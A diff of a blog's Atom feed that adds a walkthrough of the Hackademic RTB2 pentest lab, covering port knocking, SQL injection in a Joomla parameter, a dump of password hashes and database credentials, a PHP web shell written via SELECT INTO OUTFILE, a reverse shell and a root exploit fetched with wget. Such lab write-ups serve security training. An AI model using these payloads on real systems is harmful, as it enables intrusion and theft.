@@ -4,7 +4,7 @@
   <title><![CDATA[Category: ctf | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2016-07-18T12:57:26-04:00</updated>
+  <updated>2016-07-27T08:55:10-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,221 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Hackademic RTB2]]></title>
+    <link href="http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2/"/>
+    <updated>2016-07-20T13:36:20-04:00</updated>
+    <id>http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2</id>
+    <content type="html"><![CDATA[<p>The objective is the same as the previous one, get root and read key.txt</p>
+
+<!-- more -->
+
+
+<h1>Recon</h1>
+
+<p>Again, this will be a web hacking mission, only web server is available.</p>
+
+<p><img class="center" src="/images/pentest/hackademic/rtb2-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>
+
+<p>There was nothing in the source code, no suspicious headers, no sql injection in the login. I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>
+
+<p><code>plain
+nmap -sU -F -n -T4 192.168.80.166
+PORT     STATE SERVICE  REASON
+5353/udp open  zeroconf udp-response ttl 255
+</code></p>
+
+<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>
+
+<p>``` plain
+nmap  -p- 192.168.80.166</p>
+
+<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-07-21 08:14 EDT
+Nmap scan report for 192.168.80.166
+Host is up, received arp-response (0.00024s latency).
+Not shown: 65533 closed ports, 1 filtered port
+Reason: 65533 resets and 1 port-unreach
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 64
+```</p>
+
+<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>
+
+<p><code>plain
+PORT    STATE SERVICE REASON
+80/tcp  open  http    syn-ack ttl 64
+666/tcp open  doom    syn-ack ttl 64
+</code></p>
+
+<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>
+
+<p><code>plain
+666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))
+</code></p>
+
+<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>
+
+<p><code>plain
+%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A
+</code></p>
+
+<p>Decoding it yielded a hex string this time:</p>
+
+<p><code>plain
+3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0a 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 0d 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e
+</code></p>
+
+<p>After decoding the hex string, I got this message:</p>
+
+<p><code>plain
+&lt;---------&gt;
+Knock Knock Knockin' on heaven's door .. :)
+00110001 00110000 00110000 00110001 00111010 00110001 00110001 00110000 00110001 00111010 00110001 00110000 00110001 00110001 00111010 00110001 00110000 00110000 00110001
+&lt;---------&gt;
+</code></p>
+
+<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>
+
+<p>``` plain</p>
+
+<h1>!/bin/bash</h1>
+
+<p>for i in 1001 1101 1011 1001
+do
+nc 192.168.80.167 80 $i
+done
+```</p>
+
+<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>
+
+<p><img class="center" src="/images/pentest/hackademic/rtb2-hidden.png" title="&lsquo;hidden web server&rsquo; &lsquo;hidden web server&rsquo;" ></p>
+
+<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>
+
+<p><code>plain
+Info -&gt; CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities
+Versions effected: Joomla! 1.5.12
+Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
+Exploit: While Joomla! team announced only File Upload vulnerability, in fact there are many. See: http://www.milw0rm.com/exploits/9296
+Vulnerable? Yes
+</code></p>
+
+<p>Ok, let&rsquo;s keep this in mind and continue looking. I ran Nikto against this new web server and it reported entries in robots.txt!</p>
+
+<p><code>plain
+User-agent: *
+Disallow: /administrator/
+Disallow: /cache/
+Disallow: /components/
+Disallow: /images/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /libraries/
+Disallow: /media/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /templates/
+Disallow: /tmp/
+Disallow: /xmlrpc/
+</code></p>
+
+<h1>Exploit</h1>
+
+<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>
+
+<p>``` plain
+<a href="http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3">http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3</a></p>
+
+<p>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;%&rsquo; GROUP BY title ORDER BY title' at line 1 SQL=SELECT id, title FROM jos_content WHERE state = 1 AND UPPER(title) LIKE &lsquo;&rsquo;%&lsquo; GROUP BY title ORDER BY title
+&rsquo;
+```</p>
+
+<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>
+
+<p><code>plain
+username    usertype    password
+Administrator   Super Administrator 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
+JSmith  Registered  992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF
+BTallor Registered  abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
+hacky   Registered  19630caea014ce1746ec41b074973c04:LSGCiJLhUyxZRLOMAcy96PTmbN8nnxIL
+</code></p>
+
+<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>
+
+<p><code>plain
+/* Database Settings */
+var $dbtype = 'mysql';
+var $host = 'localhost';
+var $user = 'root';
+var $password = 'yUtJklM97W';
+var $db = 'joomla';
+var $dbprefix = 'jos_';
+</code></p>
+
+<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>
+
+<p><code>sql
+SELECT
+"&lt;? system($_REQUEST['cmd']); ?&gt;"
+INTO OUTFILE "/var/www/cmd.php";
+</code></p>
+
+<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>
+
+<p><code>plain
+Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
+ 15:14:37 up  4:02,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can't access tty; job control turned off
+</code></p>
+
+<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>
+
+<p><code>plain
+[snipped]
+[*] Restoring function pointer...
+id
+uid=0(root) gid=0(root)
+ls /root/
+Desktop
+Key.txt
+</code></p>
+
+<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>
+
+<p><code>plain
+root@pwnbox:~/Downloads#base64 -d key.txt &gt; decoded
+root@pwnbox:~/Downloads#file decoded
+decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced
+</code></p>
+
+<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>
+
+<p><img class="center" src="/images/pentest/hackademic/rtb2-win.png" title="&lsquo;hackademic rtb2&rsquo; &lsquo;hackademic rtb 2 finished&rsquo;" ></p>
+
+<h1>Debriefing</h1>
+
+<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>
+
+<p>``` plain
+/ You are only young once, but you can \
+\ stay immature indefinitely.          /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest lab - Hackademic RTB1]]></title>
@@ -310,7 +525,7 @@ bob> Work a little more your post</p>
 TGglMUxecjJDSDclN1Ej</p>
 
 <p>Mail me your methods at:
-<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#97;&#x6e;&#x65;&#x73;&#116;&#105;&#115;&#x40;&#98;&#x65;&#99;&#104;&#116;&#115;&#x6f;&#x75;&#x64;&#105;&#x73;&#x2e;&#x63;&#x6f;&#x6d;">&#x61;&#110;&#101;&#115;&#116;&#x69;&#115;&#64;&#x62;&#x65;&#x63;&#104;&#x74;&#x73;&#x6f;&#117;&#100;&#105;&#x73;&#46;&#99;&#x6f;&#x6d;</a>
+<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x61;&#110;&#101;&#x73;&#x74;&#105;&#x73;&#x40;&#x62;&#101;&#99;&#x68;&#116;&#x73;&#111;&#x75;&#x64;&#105;&#115;&#46;&#99;&#x6f;&#x6d;">&#97;&#x6e;&#x65;&#115;&#x74;&#105;&#115;&#64;&#x62;&#x65;&#x63;&#x68;&#116;&#x73;&#111;&#x75;&#100;&#105;&#x73;&#x2e;&#x63;&#x6f;&#x6d;</a>
 ```</p>
 
 <p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>
